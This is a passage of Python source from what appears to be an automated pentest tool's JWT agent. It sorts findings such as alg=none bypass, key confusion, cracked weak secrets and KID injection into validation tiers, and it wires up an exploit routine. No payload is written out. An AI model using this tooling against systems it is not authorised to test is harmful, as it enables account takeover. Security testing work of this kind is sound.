            "worker_stats": self._worker_pool.get_stats(),
        }

    def _get_validation_status(self, finding: Dict) -> str:
        """
        Determine tiered validation status for JWT finding.

        TIER 1 (VALIDATED_CONFIRMED): Definitive proof
            - alg=none bypass works (token accepted without signature)
            - Key confusion exploit succeeds (valid forged signature)
            - Weak secret cracked and admin token accepted
            - KID injection successful

        TIER 2 (PENDING_VALIDATION): Needs verification
            - Algorithm confusion detected but not confirmed
            - Signature not verified by server (ambiguous behavior)
            - JWT structure vulnerable but exploit not confirmed

        Most JWT findings are business logic - if the forged token is accepted
        with elevated privileges, it's VALIDATED_CONFIRMED.
        """
        vuln_type = finding.get("type", "").lower()

        # TIER 1: None algorithm bypass confirmed
        if "none" in vuln_type and finding.get("validated"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: Key confusion attack confirmed
        if "confusion" in vuln_type and finding.get("validated"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: Weak secret cracked
        if "weak" in vuln_type or "secret" in vuln_type:
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: KID injection successful
        if "kid" in vuln_type and finding.get("validated"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: Generic validated finding
        if finding.get("validated") and finding.get("status") == "VALIDATED_CONFIRMED":
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 2: Algorithm confusion detected but not exploited
        if "confusion" in vuln_type or "algorithm" in vuln_type:
            return ValidationStatus.PENDING_VALIDATION.value

        # TIER 2: JWT vulnerability detected but needs confirmation
        if not finding.get("validated"):
            return ValidationStatus.PENDING_VALIDATION.value

        # Default: Specialist trust
        return ValidationStatus.VALIDATED_CONFIRMED.value

    # =========================================================================
    # TECH CONTEXT LOADING (v3.2)
    # =========================================================================

    async def _load_jwt_tech_context(self) -> None:
        """
        Load technology stack context from recon data (v3.2).

        Uses TechContextMixin methods to load and generate context-aware
        prompts for JWT-specific deduplication (JWT library detection).
        """
        # Determine report directory
        scan_id = self._scan_context.split("/")[-1] if self._scan_context else ""
        scan_dir = settings.BASE_DIR / "reports" / scan_id if scan_id else None

        if not scan_dir or not Path(scan_dir).exists():
            logger.debug(f"[{self.name}] No report directory found, using generic tech context")
            self._tech_stack_context = {"db": "generic", "server": "generic", "lang": "generic"}
            self._jwt_prime_directive = ""
            return

        # Use TechContextMixin methods
        self._tech_stack_context = self.load_tech_stack(Path(scan_dir))
        self._jwt_prime_directive = self.generate_jwt_context_prompt(self._tech_stack_context)

        lang = self._tech_stack_context.get("lang", "generic")
        jwt_lib = self._infer_jwt_library(lang)

        logger.info(f"[{self.name}] JWT tech context loaded: lang={lang}, jwt_lib={jwt_lib}")


async def run_jwt_analysis(token: str, url: str) -> Dict:
    """Convenience function for standalone analysis."""
    agent = JWTAgent()
    await agent._analyze_and_exploit(token, url, "manual")
    return {"findings": agent.findings}

